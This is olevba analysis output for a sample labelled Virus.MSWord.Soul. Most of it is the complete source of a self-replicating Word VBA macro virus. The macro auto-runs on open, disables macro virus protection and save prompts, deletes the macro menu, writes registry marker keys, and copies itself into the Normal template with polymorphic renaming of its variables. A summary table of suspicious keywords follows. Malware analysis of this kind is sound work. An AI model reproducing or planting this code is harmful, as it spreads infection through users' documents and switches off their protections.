olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Soul-70102c9510f9dab1e33829fe148e2783d8b1967b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Soul-70102c9510f9dab1e33829fe148e2783d8b1967b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim ôÙŒóÝþ™îíÎ(16, 2) As String
Private Sub Document_New()
Call Document_Open
End Sub

Private Sub Document_Open()
Const ï§Åè»åÃÍŽïé = "ActiveDocument"
On Error Resume Next
Select Case ï§Åè»åÃÍŽïé
Case "ActiveDocument"
    Set ˆ�¸í«¹°ÌÔ÷­± = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set àÓœÂð£Šúá°ÅÇ = NormalTemplate.VBProject.VBComponents(1).CodeModule
Case "NormalTemplate"
    Set àÓœÂð£Šúá°ÅÇ = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set ˆ�¸í«¹°ÌÔ÷­± = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If Day(Date) < 5 Then
    MsgBox "Q-126 infection", vbCritical, "Q-126"
    End If
End Select
SetAttr (NormalTemplate.Name), vbNormal
CommandBars("Tools").Controls("Macro").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "me") = "Q-126 Virus" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "version") = "2.45" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "date") = "20/05/1999" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "Polymorph") = "(10..14)*126" '÷±ÁÓž¾¼ãìóß�Â
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "author") = "Lord Soulblighter" '‡Á´û‚Ñ„‘¤‹×íï
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "origin") = "Belgium" 'Chr
If àÓœÂð£Šúá°ÅÇ.Countoflines > 100 Then
Exit Sub
Else
Call Ï«š«õ–”»ÄË·ó(àÓœÂð£Šúá°ÅÇ, ˆ�¸í«¹°ÌÔ÷­±)
NormalTemplate.Save
End If
End Sub
Private Sub Document_Close()
End Sub
Private Function Ï«š«õ–”»ÄË·ó(ByVal ˆà´¹ë²½ßø­, ¯�Ïˆ…ÉœÆ¤®ì®)
Dim »çà™ÎŒöí‹´ØŽ, ‡Á´û‚Ñ„‘¤‹×íï, ÷±ÁÓž¾¼ãìóß�Â As Integer
Dim ‰Ûá•Úå‰þÕõµ As String
ôÙŒóÝþ™îíÎ(1, 1) = "ôÙŒóÝþ™îíÎ"
ôÙŒóÝþ™îíÎ(2, 1) = "ï§Åè»åÃÍŽïé"
ôÙŒóÝþ™îíÎ(3, 1) = "ˆ�¸í«¹°ÌÔ÷­±"
ôÙŒóÝþ™îíÎ(4, 1) = "àÓœÂð£Šúá°ÅÇ"
ôÙŒóÝþ™îíÎ(5, 1) = "Ï«š«õ–”»ÄË·ó"
ôÙŒóÝþ™îíÎ(6, 1) = "ˆà´¹ë²½ßø­"
ôÙŒóÝþ™îíÎ(7, 1) = "¯�Ïˆ…ÉœÆ¤®ì®"
ôÙŒóÝþ™îíÎ(8, 1) = "»çà™ÎŒöí‹´ØŽ"
ôÙŒóÝþ™îíÎ(9, 1) = "‡Á´û‚Ñ„‘¤‹×íï"
ôÙŒóÝþ™îíÎ(10, 1) = "÷±ÁÓž¾¼ãìóß�Â"
ôÙŒóÝþ™îíÎ(11, 1) = "‰Ûá•Úå‰þÕõµ"
ôÙŒóÝþ™îíÎ(12, 1) = "÷Ž¬ñ¢îªÖ–Öñ"
ôÙŒóÝþ™îíÎ(13, 1) = "‘æŸö’ —³Ü‚•˜¯"
ôÙŒóÝþ™îíÎ(14, 1) = "Ü¥ªùŠ¹Ì³�ôõñý"
ôÙŒóÝþ™îíÎ(15, 1) = "éû¥æä�òùå£ê¶"
ôÙŒóÝþ™îíÎ(16, 1) = "…è›„ì�¨ýüÝÝ"
For ‡Á´û‚Ñ„‘¤‹×íï = 1 To 16
    ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 2) = ‘æŸö’ —³Ü‚•˜¯
Next ‡Á´û‚Ñ„‘¤‹×íï
‡Á´û‚Ñ„‘¤‹×íï = ˆà´¹ë²½ßø­.Countoflines
For »çà™ÎŒöí‹´ØŽ = 1 To ‡Á´û‚Ñ„‘¤‹×íï
    ˆà´¹ë²½ßø­.…è›„ì�¨ýüÝÝLine »çà™ÎŒöí‹´ØŽ, "'"
Next »çà™ÎŒöí‹´ØŽ
‡Á´û‚Ñ„‘¤‹×íï = ˆà´¹ë²½ßø­.Countoflines
For ÷±ÁÓž¾¼ãìóß�Â = 1 To ¯�Ïˆ…ÉœÆ¤®ì®.Countoflines
‰Ûá•Úå‰þÕõµ = ¯�Ïˆ…ÉœÆ¤®ì®.Lines(÷±ÁÓž¾¼ãìóß�Â, 1)
   Select Case ‰Ûá•Úå‰þÕõµ
   Case "Const ï§Åè»åÃÍŽïé = ""ActiveDocument"""
       ‰Ûá•Úå‰þÕõµ = "Const ï§Åè»åÃÍŽïé = ""NormalTemplate"""
   Case "Const ï§Åè»åÃÍŽïé = ""NormalTemplate"""
       ‰Ûá•Úå‰þÕõµ = "Const ï§Åè»åÃÍŽïé = ""ActiveDocument"""
   Case "'"
       GoTo éû¥æä�òùå£ê¶
   End Select
   ˆà´¹ë²½ßø­.InsertLines (‡Á´û‚Ñ„‘¤‹×íï + ÷±ÁÓž¾¼ãìóß�Â), …è›„ì�¨ýüÝÝ(‰Ûá•Úå‰þÕõµ)
éû¥æä�òùå£ê¶:
Next ÷±ÁÓž¾¼ãìóß�Â
End Function
Private Function …è›„ì�¨ýüÝÝ(Ü¥ªùŠ¹Ì³�ôõñý As String)
Dim ‰Ûá•Úå‰þÕõµ As String
Dim ÷Ž¬ñ¢îªÖ–Öñ As Boolean
Dim ÷±ÁÓž¾¼ãìóß�Â, ‡Á´û‚Ñ„‘¤‹×íï As Integer
For ‡Á´û‚Ñ„‘¤‹×íï = 1 To 16
÷Ž¬ñ¢îªÖ–Öñ = True
While ÷Ž¬ñ¢îªÖ–Öñ = True
  ÷Ž¬ñ¢îªÖ–Öñ = False
  For ÷±ÁÓž¾¼ãìóß�Â = 1 To (Len(Ü¥ªùŠ¹Ì³�ôõñý) - Len(ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1)) + 1)
    ‰Ûá•Úå‰þÕõµ = Mid(Ü¥ªùŠ¹Ì³�ôõñý, ÷±ÁÓž¾¼ãìóß�Â, Len(ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1)))
    If ‰Ûá•Úå‰þÕõµ = ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1) Then
      Ü¥ªùŠ¹Ì³�ôõñý = Left(Ü¥ªùŠ¹Ì³�ôõñý, ÷±ÁÓž¾¼ãìóß�Â - 1) & ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 2) & Right(Ü¥ªùŠ¹Ì³�ôõñý, Len(Ü¥ªùŠ¹Ì³�ôõñý) - ÷±ÁÓž¾¼ãìóß�Â - Len(ôÙŒóÝþ™îíÎ(‡Á´û‚Ñ„‘¤‹×íï, 1)) + 1)
      ÷Ž¬ñ¢îªÖ–Öñ = True
    End If
 Next ÷±ÁÓž¾¼ãìóß�Â
Wend
Next ‡Á´û‚Ñ„‘¤‹×íï
…è›„ì�¨ýüÝÝ = Ü¥ªùŠ¹Ì³�ôõñý
End Function
Private Function ‘æŸö’ —³Ü‚•˜¯()
Dim ÷±ÁÓž¾¼ãìóß�Â As Integer
‘æŸö’ —³Ü‚•˜¯ = ""
Randomize
÷±ÁÓž¾¼ãìóß�Â = Int((4 * Rnd) + 10)
While Len(‘æŸö’ —³Ü‚•˜¯) < ÷±ÁÓž¾¼ãìóß�Â
    Randomize
    ‘æŸö’ —³Ü‚•˜¯ = ‘æŸö’ —³Ü‚•˜¯ + Chr(Int((126 * Rnd) + 129))
Wend
End Function






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

